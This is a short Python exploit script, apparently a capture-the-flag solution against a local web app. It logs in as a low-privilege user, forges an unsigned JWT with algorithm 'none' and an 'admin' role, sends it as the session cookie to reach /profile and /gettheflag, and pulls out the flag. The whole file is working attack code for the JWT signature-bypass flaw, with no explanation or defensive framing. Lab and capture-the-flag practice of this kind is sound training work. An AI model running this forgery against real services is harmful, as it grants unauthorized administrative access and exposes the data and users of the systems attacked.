import requests
import json
import base64

BASE_URL = "http://127.0.0.1:5003"

def base64url_encode(data):
    """Base64url encode without padding"""
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode('utf-8')
    elif isinstance(data, str):
        data = data.encode('utf-8')
    
    encoded = base64.urlsafe_b64encode(data).decode('utf-8')
    return encoded.rstrip('=')

# Step 1: Login verification
print("[*] Step 1: Login as user:user")
login_data = {"username": "user", "password": "user"}
resp = requests.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text[:200]}")

# Step 2: Craft unsigned JWT
print("\n[*] Step 2: Craft unsigned admin JWT")
header = {"alg": "none", "typ": "JWT"}
payload = {"username": "user", "role": "admin"}

header_encoded = base64url_encode(header)
payload_encoded = base64url_encode(payload)
unsigned_jwt = f"{header_encoded}.{payload_encoded}."

print(f"Unsigned JWT: {unsigned_jwt}")

# Step 3: Access /profile
print("\n[*] Step 3: Access /profile with admin JWT")
cookies = {"session": unsigned_jwt}
resp = requests.get(f"{BASE_URL}/profile", cookies=cookies)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Step 4: Get the flag
print("\n[*] Step 4: Access /gettheflag with admin JWT")
resp = requests.get(f"{BASE_URL}/gettheflag", cookies=cookies)
print(f"Status: {resp.status_code}")
print(f"Response: {resp.text}")

# Extract flag
import re
flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
if flag_match:
    print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")

